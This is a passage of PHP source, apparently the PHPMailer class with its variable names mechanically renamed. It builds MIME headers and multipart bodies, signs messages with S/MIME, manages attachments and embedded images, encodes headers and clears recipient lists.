1)) { --$sp9f5735; } elseif ('=' === substr($spc50cef, $sp9f5735 - 2, 1)) { $sp9f5735 -= 2; } $sp9d6ae3 = substr($spc50cef, 0, $sp9f5735); $spc50cef = (string) substr($spc50cef, $sp9f5735); if ($spc50cef !== '') { $sp6df182 .= $sp9d6ae3 . sprintf('=%s', static::$LE); } else { $sp2ff79a = $sp9d6ae3; } } } else { $spea98bd = $sp2ff79a; if (!$sp1e2908) { $sp2ff79a .= ' '; } $sp2ff79a .= $spc50cef; if ('' !== $spea98bd && strlen($sp2ff79a) > $sp58643f) { $sp6df182 .= $spea98bd . $sp7bdf4e; $sp2ff79a = $spc50cef; } } $sp1e2908 = false; } $sp6df182 .= $sp2ff79a . static::$LE; } return $sp6df182; } public function utf8CharBoundary($sp6a7521, $sp96793e) { $spc6c123 = false; $spfe47c0 = 3; while (!$spc6c123) { $sp121c89 = substr($sp6a7521, $sp96793e - $spfe47c0, $spfe47c0); $spc07df3 = strpos($sp121c89, '='); if (false !== $spc07df3) { $sp742427 = substr($sp6a7521, $sp96793e - $spfe47c0 + $spc07df3 + 1, 2); $spc871f0 = hexdec($sp742427); if ($spc871f0 < 128) { if ($spc07df3 > 0) { $sp96793e -= $spfe47c0 - $spc07df3; } $spc6c123 = true; } elseif ($spc871f0 >= 192) { $sp96793e -= $spfe47c0 - $spc07df3; $spc6c123 = true; } elseif ($spc871f0 < 192) { $spfe47c0 += 3; } } else { $spc6c123 = true; } } return $sp96793e; } public function setWordWrap() { if ($this->WordWrap < 1) { return; } switch ($this->message_type) { case 'alt': case 'alt_inline': case 'alt_attach': case 'alt_inline_attach': $this->AltBody = $this->wrapText($this->AltBody, $this->WordWrap); break; default: $this->Body = $this->wrapText($this->Body, $this->WordWrap); break; } } public function createHeader() { $spf7a64c = ''; $spf7a64c .= $this->headerLine('Date', '' === $this->MessageDate ? self::rfcDate() : $this->MessageDate); if ($this->SingleTo) { if ('mail' !== $this->Mailer) { foreach ($this->to as $sp33348c) { $this->SingleToArray[] = $this->addrFormat($sp33348c); } } } elseif (count($this->to) > 0) { if ('mail' !== $this->Mailer) { $spf7a64c .= $this->addrAppend('To', $this->to); } } elseif (count($this->cc) === 0) { $spf7a64c .= $this->headerLine('To', 'undisclosed-recipients:;'); } $spf7a64c .= $this->addrAppend('From', array(array(trim($this->From), $this->FromName))); if (count($this->cc) > 0) { $spf7a64c .= $this->addrAppend('Cc', $this->cc); } if (('sendmail' === $this->Mailer || 'qmail' === $this->Mailer || 'mail' === $this->Mailer) && count($this->bcc) > 0) { $spf7a64c .= $this->addrAppend('Bcc', $this->bcc); } if (count($this->ReplyTo) > 0) { $spf7a64c .= $this->addrAppend('Reply-To', $this->ReplyTo); } if ('mail' !== $this->Mailer) { $spf7a64c .= $this->headerLine('Subject', $this->encodeHeader($this->secureHeader($this->Subject))); } if ('' !== $this->MessageID && preg_match('/^<.*@.*>$/', $this->MessageID)) { $this->lastMessageID = $this->MessageID; } else { $this->lastMessageID = sprintf('<%s@%s>', $this->uniqueid, $this->serverHostname()); } $spf7a64c .= $this->headerLine('Message-ID', $this->lastMessageID); if (null !== $this->Priority) { $spf7a64c .= $this->headerLine('X-Priority', $this->Priority); } if ('' !== $this->ConfirmReadingTo) { $spf7a64c .= $this->headerLine('Disposition-Notification-To', '<' . $this->ConfirmReadingTo . '>'); } foreach ($this->CustomHeader as $sp6d38ac) { $spf7a64c .= $this->headerLine(trim($sp6d38ac[0]), $this->encodeHeader(trim($sp6d38ac[1]))); } if (!$this->sign_key_file) { $spf7a64c .= $this->headerLine('MIME-Version', '1.0'); $spf7a64c .= $this->getMailMIME(); } return $spf7a64c; } public function getMailMIME() { $spf7a64c = ''; $sp609365 = true; switch ($this->message_type) { case 'inline': $spf7a64c .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spf7a64c .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; case 'attach': case 'inline_attach': case 'alt_attach': case 'alt_inline_attach': $spf7a64c .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_MIXED . ';'); $spf7a64c .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; case 'alt': case 'alt_inline': $spf7a64c .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spf7a64c .= $this->textLine(' boundary="' . $this->boundary[1] . '"'); break; default: $spf7a64c .= $this->textLine('Content-Type: ' . $this->ContentType . '; charset=' . $this->CharSet); $sp609365 = false; break; } if (static::ENCODING_7BIT !== $this->Encoding) { if ($sp609365) { if (static::ENCODING_8BIT === $this->Encoding) { $spf7a64c .= $this->headerLine('Content-Transfer-Encoding', static::ENCODING_8BIT); } } else { $spf7a64c .= $this->headerLine('Content-Transfer-Encoding', $this->Encoding); } } if ('mail' !== $this->Mailer) { } return $spf7a64c; } public function getSentMIMEMessage() { return static::stripTrailingWSP($this->MIMEHeader . $this->mailHeader) . static::$LE . static::$LE . $this->MIMEBody; } protected function generateId() { $sp9f5735 = 32; $sp3dfb2a = ''; if (function_exists('random_bytes')) { try { $sp3dfb2a = random_bytes($sp9f5735); } catch (\Exception $spf77d78) { } } elseif (function_exists('openssl_random_pseudo_bytes')) { $sp3dfb2a = openssl_random_pseudo_bytes($sp9f5735); } if ($sp3dfb2a === '') { $sp3dfb2a = hash('sha256', uniqid((string) mt_rand(), true), true); } return str_replace(array('=', '+', '/'), '', base64_encode(hash('sha256', $sp3dfb2a, true))); } public function createBody() { $spa717d7 = ''; $this->uniqueid = $this->generateId(); $this->boundary[1] = 'b1_' . $this->uniqueid; $this->boundary[2] = 'b2_' . $this->uniqueid; $this->boundary[3] = 'b3_' . $this->uniqueid; if ($this->sign_key_file) { $spa717d7 .= $this->getMailMIME() . static::$LE; } $this->setWordWrap(); $spcf3063 = $this->Encoding; $spe5975c = $this->CharSet; if (static::ENCODING_8BIT === $spcf3063 && !$this->has8bitChars($this->Body)) { $spcf3063 = static::ENCODING_7BIT; $spe5975c = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $this->Encoding && static::hasLineLongerThanMax($this->Body)) { $spcf3063 = static::ENCODING_QUOTED_PRINTABLE; } $spfa9966 = $this->Encoding; $spaab4f6 = $this->CharSet; if (static::ENCODING_8BIT === $spfa9966 && !$this->has8bitChars($this->AltBody)) { $spfa9966 = static::ENCODING_7BIT; $spaab4f6 = static::CHARSET_ASCII; } if (static::ENCODING_BASE64 !== $spfa9966 && static::hasLineLongerThanMax($this->AltBody)) { $spfa9966 = static::ENCODING_QUOTED_PRINTABLE; } $sp67ad03 = 'This is a multi-part message in MIME format.' . static::$LE . static::$LE; switch ($this->message_type) { case 'inline': $spa717d7 .= $sp67ad03; $spa717d7 .= $this->getBoundary($this->boundary[1], $spe5975c, '', $spcf3063); $spa717d7 .= $this->encodeString($this->Body, $spcf3063); $spa717d7 .= static::$LE; $spa717d7 .= $this->attachAll('inline', $this->boundary[1]); break; case 'attach': $spa717d7 .= $sp67ad03; $spa717d7 .= $this->getBoundary($this->boundary[1], $spe5975c, '', $spcf3063); $spa717d7 .= $this->encodeString($this->Body, $spcf3063); $spa717d7 .= static::$LE; $spa717d7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'inline_attach': $spa717d7 .= $sp67ad03; $spa717d7 .= $this->textLine('--' . $this->boundary[1]); $spa717d7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spa717d7 .= $this->textLine(' boundary="' . $this->boundary[2] . '";'); $spa717d7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spa717d7 .= static::$LE; $spa717d7 .= $this->getBoundary($this->boundary[2], $spe5975c, '', $spcf3063); $spa717d7 .= $this->encodeString($this->Body, $spcf3063); $spa717d7 .= static::$LE; $spa717d7 .= $this->attachAll('inline', $this->boundary[2]); $spa717d7 .= static::$LE; $spa717d7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'alt': $spa717d7 .= $sp67ad03; $spa717d7 .= $this->getBoundary($this->boundary[1], $spaab4f6, static::CONTENT_TYPE_PLAINTEXT, $spfa9966); $spa717d7 .= $this->encodeString($this->AltBody, $spfa9966); $spa717d7 .= static::$LE; $spa717d7 .= $this->getBoundary($this->boundary[1], $spe5975c, static::CONTENT_TYPE_TEXT_HTML, $spcf3063); $spa717d7 .= $this->encodeString($this->Body, $spcf3063); $spa717d7 .= static::$LE; if (!empty($this->Ical)) { $spc876fe = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $sp63ccc4) { if (stripos($this->Ical, 'METHOD:' . $sp63ccc4) !== false) { $spc876fe = $sp63ccc4; break; } } $spa717d7 .= $this->getBoundary($this->boundary[1], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=' . $spc876fe, ''); $spa717d7 .= $this->encodeString($this->Ical, $this->Encoding); $spa717d7 .= static::$LE; } $spa717d7 .= $this->endBoundary($this->boundary[1]); break; case 'alt_inline': $spa717d7 .= $sp67ad03; $spa717d7 .= $this->getBoundary($this->boundary[1], $spaab4f6, static::CONTENT_TYPE_PLAINTEXT, $spfa9966); $spa717d7 .= $this->encodeString($this->AltBody, $spfa9966); $spa717d7 .= static::$LE; $spa717d7 .= $this->textLine('--' . $this->boundary[1]); $spa717d7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spa717d7 .= $this->textLine(' boundary="' . $this->boundary[2] . '";'); $spa717d7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spa717d7 .= static::$LE; $spa717d7 .= $this->getBoundary($this->boundary[2], $spe5975c, static::CONTENT_TYPE_TEXT_HTML, $spcf3063); $spa717d7 .= $this->encodeString($this->Body, $spcf3063); $spa717d7 .= static::$LE; $spa717d7 .= $this->attachAll('inline', $this->boundary[2]); $spa717d7 .= static::$LE; $spa717d7 .= $this->endBoundary($this->boundary[1]); break; case 'alt_attach': $spa717d7 .= $sp67ad03; $spa717d7 .= $this->textLine('--' . $this->boundary[1]); $spa717d7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spa717d7 .= $this->textLine(' boundary="' . $this->boundary[2] . '"'); $spa717d7 .= static::$LE; $spa717d7 .= $this->getBoundary($this->boundary[2], $spaab4f6, static::CONTENT_TYPE_PLAINTEXT, $spfa9966); $spa717d7 .= $this->encodeString($this->AltBody, $spfa9966); $spa717d7 .= static::$LE; $spa717d7 .= $this->getBoundary($this->boundary[2], $spe5975c, static::CONTENT_TYPE_TEXT_HTML, $spcf3063); $spa717d7 .= $this->encodeString($this->Body, $spcf3063); $spa717d7 .= static::$LE; if (!empty($this->Ical)) { $spc876fe = static::ICAL_METHOD_REQUEST; foreach (static::$IcalMethods as $sp63ccc4) { if (stripos($this->Ical, 'METHOD:' . $sp63ccc4) !== false) { $spc876fe = $sp63ccc4; break; } } $spa717d7 .= $this->getBoundary($this->boundary[2], '', static::CONTENT_TYPE_TEXT_CALENDAR . '; method=' . $spc876fe, ''); $spa717d7 .= $this->encodeString($this->Ical, $this->Encoding); } $spa717d7 .= $this->endBoundary($this->boundary[2]); $spa717d7 .= static::$LE; $spa717d7 .= $this->attachAll('attachment', $this->boundary[1]); break; case 'alt_inline_attach': $spa717d7 .= $sp67ad03; $spa717d7 .= $this->textLine('--' . $this->boundary[1]); $spa717d7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_ALTERNATIVE . ';'); $spa717d7 .= $this->textLine(' boundary="' . $this->boundary[2] . '"'); $spa717d7 .= static::$LE; $spa717d7 .= $this->getBoundary($this->boundary[2], $spaab4f6, static::CONTENT_TYPE_PLAINTEXT, $spfa9966); $spa717d7 .= $this->encodeString($this->AltBody, $spfa9966); $spa717d7 .= static::$LE; $spa717d7 .= $this->textLine('--' . $this->boundary[2]); $spa717d7 .= $this->headerLine('Content-Type', static::CONTENT_TYPE_MULTIPART_RELATED . ';'); $spa717d7 .= $this->textLine(' boundary="' . $this->boundary[3] . '";'); $spa717d7 .= $this->textLine(' type="' . static::CONTENT_TYPE_TEXT_HTML . '"'); $spa717d7 .= static::$LE; $spa717d7 .= $this->getBoundary($this->boundary[3], $spe5975c, static::CONTENT_TYPE_TEXT_HTML, $spcf3063); $spa717d7 .= $this->encodeString($this->Body, $spcf3063); $spa717d7 .= static::$LE; $spa717d7 .= $this->attachAll('inline', $this->boundary[3]); $spa717d7 .= static::$LE; $spa717d7 .= $this->endBoundary($this->boundary[2]); $spa717d7 .= static::$LE; $spa717d7 .= $this->attachAll('attachment', $this->boundary[1]); break; default: $this->Encoding = $spcf3063; $spa717d7 .= $this->encodeString($this->Body, $this->Encoding); break; } if ($this->isError()) { $spa717d7 = ''; if ($this->exceptions) { throw new Exception($this->lang('empty_message'), self::STOP_CRITICAL); } } elseif ($this->sign_key_file) { try { if (!defined('PKCS7_TEXT')) { throw new Exception($this->lang('extension_missing') . 'openssl'); } $sp509c44 = tempnam(sys_get_temp_dir(), 'srcsign'); $sp583e3a = tempnam(sys_get_temp_dir(), 'mailsign'); file_put_contents($sp509c44, $spa717d7); if (empty($this->sign_extracerts_file)) { $sp3181f2 = @openssl_pkcs7_sign($sp509c44, $sp583e3a, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), array()); } else { $sp3181f2 = @openssl_pkcs7_sign($sp509c44, $sp583e3a, 'file://' . realpath($this->sign_cert_file), array('file://' . realpath($this->sign_key_file), $this->sign_key_pass), array(), PKCS7_DETACHED, $this->sign_extracerts_file); } @unlink($sp509c44); if ($sp3181f2) { $spa717d7 = file_get_contents($sp583e3a); @unlink($sp583e3a); $spdeecb9 = explode('

', $spa717d7, 2); $this->MIMEHeader .= $spdeecb9[0] . static::$LE . static::$LE; $spa717d7 = $spdeecb9[1]; } else { @unlink($sp583e3a); throw new Exception($this->lang('signing') . openssl_error_string()); } } catch (Exception $spa8a109) { $spa717d7 = ''; if ($this->exceptions) { throw $spa8a109; } } } return $spa717d7; } protected function getBoundary($spf9e005, $sp4c79f3, $sp492c8e, $sp197e1c) { $spf7a64c = ''; if ('' === $sp4c79f3) { $sp4c79f3 = $this->CharSet; } if ('' === $sp492c8e) { $sp492c8e = $this->ContentType; } if ('' === $sp197e1c) { $sp197e1c = $this->Encoding; } $spf7a64c .= $this->textLine('--' . $spf9e005); $spf7a64c .= sprintf('Content-Type: %s; charset=%s', $sp492c8e, $sp4c79f3); $spf7a64c .= static::$LE; if (static::ENCODING_7BIT !== $sp197e1c) { $spf7a64c .= $this->headerLine('Content-Transfer-Encoding', $sp197e1c); } $spf7a64c .= static::$LE; return $spf7a64c; } protected function endBoundary($spf9e005) { return static::$LE . '--' . $spf9e005 . '--' . static::$LE; } protected function setMessageType() { $spcee89e = array(); if ($this->alternativeExists()) { $spcee89e[] = 'alt'; } if ($this->inlineImageExists()) { $spcee89e[] = 'inline'; } if ($this->attachmentExists()) { $spcee89e[] = 'attach'; } $this->message_type = implode('_', $spcee89e); if ('' === $this->message_type) { $this->message_type = 'plain'; } } public function headerLine($spa6eece, $sp5f1c2e) { return $spa6eece . ': ' . $sp5f1c2e . static::$LE; } public function textLine($sp5f1c2e) { return $sp5f1c2e . static::$LE; } public function addAttachment($sp3db27e, $spa6eece = '', $sp197e1c = self::ENCODING_BASE64, $spcee89e = '', $sp99a1f5 = 'attachment') { try { if (!static::isPermittedPath($sp3db27e) || !@is_file($sp3db27e) || !is_readable($sp3db27e)) { throw new Exception($this->lang('file_access') . $sp3db27e, self::STOP_CONTINUE); } if ('' === $spcee89e) { $spcee89e = static::filenameToType($sp3db27e); } $sp6512ab = (string) static::mb_pathinfo($sp3db27e, PATHINFO_BASENAME); if ('' === $spa6eece) { $spa6eece = $sp6512ab; } if (!$this->validateEncoding($sp197e1c)) { throw new Exception($this->lang('encoding') . $sp197e1c); } $this->attachment[] = array(0 => $sp3db27e, 1 => $sp6512ab, 2 => $spa6eece, 3 => $sp197e1c, 4 => $spcee89e, 5 => false, 6 => $sp99a1f5, 7 => $spa6eece); } catch (Exception $spa8a109) { $this->setError($spa8a109->getMessage()); $this->edebug($spa8a109->getMessage()); if ($this->exceptions) { throw $spa8a109; } return false; } return true; } public function getAttachments() { return $this->attachment; } protected function attachAll($sp934de9, $spf9e005) { $sp618989 = array(); $sp32b947 = array(); $spa47338 = array(); foreach ($this->attachment as $sp970ac5) { if ($sp970ac5[6] === $sp934de9) { $sp9312ed = ''; $sp3db27e = ''; $sp7f51d3 = $sp970ac5[5]; if ($sp7f51d3) { $sp9312ed = $sp970ac5[0]; } else { $sp3db27e = $sp970ac5[0]; } $sp21b043 = hash('sha256', serialize($sp970ac5)); if (in_array($sp21b043, $spa47338, true)) { continue; } $spa47338[] = $sp21b043; $spa6eece = $sp970ac5[2]; $sp197e1c = $sp970ac5[3]; $spcee89e = $sp970ac5[4]; $sp99a1f5 = $sp970ac5[6]; $spb7ac25 = $sp970ac5[7]; if ('inline' === $sp99a1f5 && array_key_exists($spb7ac25, $sp32b947)) { continue; } $sp32b947[$spb7ac25] = true; $sp618989[] = sprintf('--%s%s', $spf9e005, static::$LE); if (!empty($spa6eece)) { $sp618989[] = sprintf('Content-Type: %s; name=%s%s', $spcee89e, static::quotedString($this->encodeHeader($this->secureHeader($spa6eece))), static::$LE); } else { $sp618989[] = sprintf('Content-Type: %s%s', $spcee89e, static::$LE); } if (static::ENCODING_7BIT !== $sp197e1c) { $sp618989[] = sprintf('Content-Transfer-Encoding: %s%s', $sp197e1c, static::$LE); } if ((string) $spb7ac25 !== '' && $sp99a1f5 === 'inline') { $sp618989[] = 'Content-ID: <' . $this->encodeHeader($this->secureHeader($spb7ac25)) . '>' . static::$LE; } if (!empty($sp99a1f5)) { $sp1577f5 = $this->encodeHeader($this->secureHeader($spa6eece)); if (!empty($sp1577f5)) { $sp618989[] = sprintf('Content-Disposition: %s; filename=%s%s', $sp99a1f5, static::quotedString($sp1577f5), static::$LE . static::$LE); } else { $sp618989[] = sprintf('Content-Disposition: %s%s', $sp99a1f5, static::$LE . static::$LE); } } else { $sp618989[] = static::$LE; } if ($sp7f51d3) { $sp618989[] = $this->encodeString($sp9312ed, $sp197e1c); } else { $sp618989[] = $this->encodeFile($sp3db27e, $sp197e1c); } if ($this->isError()) { return ''; } $sp618989[] = static::$LE; } } $sp618989[] = sprintf('--%s--%s', $spf9e005, static::$LE); return implode('', $sp618989); } protected function encodeFile($sp3db27e, $sp197e1c = self::ENCODING_BASE64) { try { if (!static::isPermittedPath($sp3db27e) || !file_exists($sp3db27e) || !is_readable($sp3db27e)) { throw new Exception($this->lang('file_open') . $sp3db27e, self::STOP_CONTINUE); } $sp1223a5 = file_get_contents($sp3db27e); if (false === $sp1223a5) { throw new Exception($this->lang('file_open') . $sp3db27e, self::STOP_CONTINUE); } $sp1223a5 = $this->encodeString($sp1223a5, $sp197e1c); return $sp1223a5; } catch (Exception $spa8a109) { $this->setError($spa8a109->getMessage()); $this->edebug($spa8a109->getMessage()); if ($this->exceptions) { throw $spa8a109; } return ''; } } public function encodeString($sp9f0ad1, $sp197e1c = self::ENCODING_BASE64) { $sp9804c0 = ''; switch (strtolower($sp197e1c)) { case static::ENCODING_BASE64: $sp9804c0 = chunk_split(base64_encode($sp9f0ad1), static::STD_LINE_LENGTH, static::$LE); break; case static::ENCODING_7BIT: case static::ENCODING_8BIT: $sp9804c0 = static::normalizeBreaks($sp9f0ad1); if (substr($sp9804c0, -strlen(static::$LE)) !== static::$LE) { $sp9804c0 .= static::$LE; } break; case static::ENCODING_BINARY: $sp9804c0 = $sp9f0ad1; break; case static::ENCODING_QUOTED_PRINTABLE: $sp9804c0 = $this->encodeQP($sp9f0ad1); break; default: $this->setError($this->lang('encoding') . $sp197e1c); if ($this->exceptions) { throw new Exception($this->lang('encoding') . $sp197e1c); } break; } return $sp9804c0; } public function encodeHeader($sp9f0ad1, $sp0c780b = 'text') { $sp16d3e5 = 0; switch (strtolower($sp0c780b)) { case 'phrase': if (!preg_match('/[\\200-\\377]/', $sp9f0ad1)) { $sp9804c0 = addcslashes($sp9f0ad1, ' ..\\"'); if ($sp9f0ad1 === $sp9804c0 && !preg_match('/[^A-Za-z0-9!#$%&\'*+\\/=?^_`{|}~ -]/', $sp9f0ad1)) { return $sp9804c0; } return "\"{$sp9804c0}\""; } $sp16d3e5 = preg_match_all('/[^\\040\\041\\043-\\133\\135-\\176]/', $sp9f0ad1, $sp11e5d9); break; case 'comment': $sp16d3e5 = preg_match_all('/[()"]/', $sp9f0ad1, $sp11e5d9); case 'text': default: $sp16d3e5 += preg_match_all('/[\\000-\\010\\013\\014\\016-\\037\\177-\\377]/', $sp9f0ad1, $sp11e5d9); break; } if ($this->has8bitChars($sp9f0ad1)) { $spe1adec = $this->CharSet; } else { $spe1adec = static::CHARSET_ASCII; } $spb08430 = 8 + strlen($spe1adec); if ('mail' === $this->Mailer) { $sp66a5ab = static::MAIL_MAX_LINE_LENGTH - $spb08430; } else { $sp66a5ab = static::MAX_LINE_LENGTH - $spb08430; } if ($sp16d3e5 > strlen($sp9f0ad1) / 3) { $sp197e1c = 'B'; } elseif ($sp16d3e5 > 0) { $sp197e1c = 'Q'; } elseif (strlen($sp9f0ad1) > $sp66a5ab) { $sp197e1c = 'Q'; } else { $sp197e1c = false; } switch ($sp197e1c) { case 'B': if ($this->hasMultiBytes($sp9f0ad1)) { $sp9804c0 = $this->base64EncodeWrapMB($sp9f0ad1, '
'); } else { $sp9804c0 = base64_encode($sp9f0ad1); $sp66a5ab -= $sp66a5ab % 4; $sp9804c0 = trim(chunk_split($sp9804c0, $sp66a5ab, '
')); } $sp9804c0 = preg_replace('/^(.*)$/m', ' =?' . $spe1adec . "?{$sp197e1c}?\\1?=", $sp9804c0); break; case 'Q': $sp9804c0 = $this->encodeQ($sp9f0ad1, $sp0c780b); $sp9804c0 = $this->wrapText($sp9804c0, $sp66a5ab, true); $sp9804c0 = str_replace('=' . static::$LE, '
', trim($sp9804c0)); $sp9804c0 = preg_replace('/^(.*)$/m', ' =?' . $spe1adec . "?{$sp197e1c}?\\1?=", $sp9804c0); break; default: return $sp9f0ad1; } return trim(static::normalizeBreaks($sp9804c0)); } public function hasMultiBytes($sp9f0ad1) { if (function_exists('mb_strlen')) { return strlen($sp9f0ad1) > mb_strlen($sp9f0ad1, $this->CharSet); } return false; } public function has8bitChars($sp4cc22d) { return (bool) preg_match('/[\\x80-\\xFF]/', $sp4cc22d); } public function base64EncodeWrapMB($sp9f0ad1, $sp53dd74 = null) { $sp5e6d9a = '=?' . $this->CharSet . '?B?'; $sp810804 = '?='; $sp9804c0 = ''; if (null === $sp53dd74) { $sp53dd74 = static::$LE; } $sp079c79 = mb_strlen($sp9f0ad1, $this->CharSet); $sp58643f = 75 - strlen($sp5e6d9a) - strlen($sp810804); $sp3ff939 = $sp079c79 / strlen($sp9f0ad1); $sp2156d6 = floor($sp58643f * $sp3ff939 * 0.75); $spbb34b1 = 0; for ($sp16364a = 0; $sp16364a < $sp079c79; $sp16364a += $spbb34b1) { $spfe47c0 = 0; do { $spbb34b1 = $sp2156d6 - $spfe47c0; $spa5d418 = mb_substr($sp9f0ad1, $sp16364a, $spbb34b1, $this->CharSet); $spa5d418 = base64_encode($spa5d418); ++$spfe47c0; } while (strlen($spa5d418) > $sp58643f); $sp9804c0 .= $spa5d418 . $sp53dd74; } return substr($sp9804c0, 0, -strlen($sp53dd74)); } public function encodeQP($sp9312ed) { return static::normalizeBreaks(quoted_printable_encode($sp9312ed)); } public function encodeQ($sp9f0ad1, $sp0c780b = 'text') { $sp74a15a = ''; $sp9804c0 = str_replace(array('', '
'), '', $sp9f0ad1); switch (strtolower($sp0c780b)) { case 'phrase': $sp74a15a = '^A-Za-z0-9!*+\\/ -'; break; case 'comment': $sp74a15a = '\\(\\)"'; case 'text': default: $sp74a15a = '\\000-\\011\\013\\014\\016-\\037\\075\\077\\137\\177-\\377' . $sp74a15a; break; } $sp11e5d9 = array(); if (preg_match_all("/[{$sp74a15a}]/", $sp9804c0, $sp11e5d9)) { $sp82441b = array_search('=', $sp11e5d9[0], true); if (false !== $sp82441b) { unset($sp11e5d9[0][$sp82441b]); array_unshift($sp11e5d9[0], '='); } foreach (array_unique($sp11e5d9[0]) as $sp2a1053) { $sp9804c0 = str_replace($sp2a1053, '=' . sprintf('%02X', ord($sp2a1053)), $sp9804c0); } } return str_replace(' ', '_', $sp9804c0); } public function addStringAttachment($sp9312ed, $sp6512ab, $sp197e1c = self::ENCODING_BASE64, $spcee89e = '', $sp99a1f5 = 'attachment') { try { if ('' === $spcee89e) { $spcee89e = static::filenameToType($sp6512ab); } if (!$this->validateEncoding($sp197e1c)) { throw new Exception($this->lang('encoding') . $sp197e1c); } $this->attachment[] = array(0 => $sp9312ed, 1 => $sp6512ab, 2 => static::mb_pathinfo($sp6512ab, PATHINFO_BASENAME), 3 => $sp197e1c, 4 => $spcee89e, 5 => true, 6 => $sp99a1f5, 7 => 0); } catch (Exception $spa8a109) { $this->setError($spa8a109->getMessage()); $this->edebug($spa8a109->getMessage()); if ($this->exceptions) { throw $spa8a109; } return false; } return true; } public function addEmbeddedImage($sp3db27e, $spb7ac25, $spa6eece = '', $sp197e1c = self::ENCODING_BASE64, $spcee89e = '', $sp99a1f5 = 'inline') { try { if (!static::isPermittedPath($sp3db27e) || !@is_file($sp3db27e) || !is_readable($sp3db27e)) { throw new Exception($this->lang('file_access') . $sp3db27e, self::STOP_CONTINUE); } if ('' === $spcee89e) { $spcee89e = static::filenameToType($sp3db27e); } if (!$this->validateEncoding($sp197e1c)) { throw new Exception($this->lang('encoding') . $sp197e1c); } $sp6512ab = (string) static::mb_pathinfo($sp3db27e, PATHINFO_BASENAME); if ('' === $spa6eece) { $spa6eece = $sp6512ab; } $this->attachment[] = array(0 => $sp3db27e, 1 => $sp6512ab, 2 => $spa6eece, 3 => $sp197e1c, 4 => $spcee89e, 5 => false, 6 => $sp99a1f5, 7 => $spb7ac25); } catch (Exception $spa8a109) { $this->setError($spa8a109->getMessage()); $this->edebug($spa8a109->getMessage()); if ($this->exceptions) { throw $spa8a109; } return false; } return true; } public function addStringEmbeddedImage($sp9312ed, $spb7ac25, $spa6eece = '', $sp197e1c = self::ENCODING_BASE64, $spcee89e = '', $sp99a1f5 = 'inline') { try { if ('' === $spcee89e && !empty($spa6eece)) { $spcee89e = static::filenameToType($spa6eece); } if (!$this->validateEncoding($sp197e1c)) { throw new Exception($this->lang('encoding') . $sp197e1c); } $this->attachment[] = array(0 => $sp9312ed, 1 => $spa6eece, 2 => $spa6eece, 3 => $sp197e1c, 4 => $spcee89e, 5 => true, 6 => $sp99a1f5, 7 => $spb7ac25); } catch (Exception $spa8a109) { $this->setError($spa8a109->getMessage()); $this->edebug($spa8a109->getMessage()); if ($this->exceptions) { throw $spa8a109; } return false; } return true; } protected function validateEncoding($sp197e1c) { return in_array($sp197e1c, array(self::ENCODING_7BIT, self::ENCODING_QUOTED_PRINTABLE, self::ENCODING_BASE64, self::ENCODING_8BIT, self::ENCODING_BINARY), true); } protected function cidExists($spb7ac25) { foreach ($this->attachment as $sp970ac5) { if ('inline' === $sp970ac5[6] && $spb7ac25 === $sp970ac5[7]) { return true; } } return false; } public function inlineImageExists() { foreach ($this->attachment as $sp970ac5) { if ('inline' === $sp970ac5[6]) { return true; } } return false; } public function attachmentExists() { foreach ($this->attachment as $sp970ac5) { if ('attachment' === $sp970ac5[6]) { return true; } } return false; } public function alternativeExists() { return !empty($this->AltBody); } public function clearQueuedAddresses($spb3be72) { $this->RecipientsQueue = array_filter($this->RecipientsQueue, static function ($sp45ffb2) use($spb3be72) { return $sp45ffb2[0] !== $spb3be72; }); } public function clearAddresses() { foreach ($this->to as $sp56d48b) { unset($this->all_recipients[strtolower($sp56d48b[0])]); } $this->to = array(); $this->clearQueuedAddresses('to'); } public function clearCCs() { foreach ($this->cc as $sp1da2c1) { unset($this->all_recipients[strtolower($sp1da2c1[0])]); } $this->cc = array(); $this->clearQueuedAddresses('cc'); } public function clearBCCs() { foreach ($this->bcc as $sp53670a) { unset($this->all_recipients[strtolower($sp53670a[0])]); } $this->bcc = array(); $this->clearQueuedAddresses('bcc'); } public function clearReplyTos() { $this->ReplyTo = array(); $this->ReplyToQueue = array(); } public function clearAllRecipients() { $this->to = array(); $this->cc = array(); $this->bcc = array(); $this->all_recipients = array(); $this->RecipientsQueue = array(); } public function clearAttachments() { $this->attachment = array(); } public function clearCustomHeaders() { $this->CustomHeader = array(); } protected function setError($sp2c6bfa) { ++$this->error_count; if ('smtp' === $this->Mailer && null !== $this->smtp) { $sp860811 = $this->smtp->getError(); if (!empty($sp860811['error'])) { $sp2c6bfa .= $this->lang('smtp_error') . $sp860811['error']; if (!empty($sp860811['detail'])) { $sp2c6bfa .= ' Detail: ' . $sp860811['detail']; } if (!empty($sp860811['smtp_code'])) { $sp2c6bfa .= ' SMTP code: ' . $sp860811['smtp_code']; } if (!empty($sp860811['smtp_code_ex'])) { $sp2c6bfa .= ' Additional SMTP info: ' . $sp860811['smtp_code_ex']; } } } $this->ErrorInfo = $sp2c6bfa; } public static function rfcDate() { date_default_timezone_set(@date_default_timezone_get()); return date('D, j M Y H:i:s O'); } protected function serverHostname() { $spf7a64c = ''; if (!empty($this->Hostname)) { $spf7a64c = $this->Hostname; } elseif (isset($_SERVER) && array_key_exists('SERVER_NAME', $_SERVER)) { $spf7a64c = $_SERVER['SERVER_NAME']; } elseif (function_exists('gethostname') && gethostname() !== false) { $spf7a64c = gethostname(); } elseif (php_uname('n') !== false) { $spf7a64c = php_uname('n'); } if 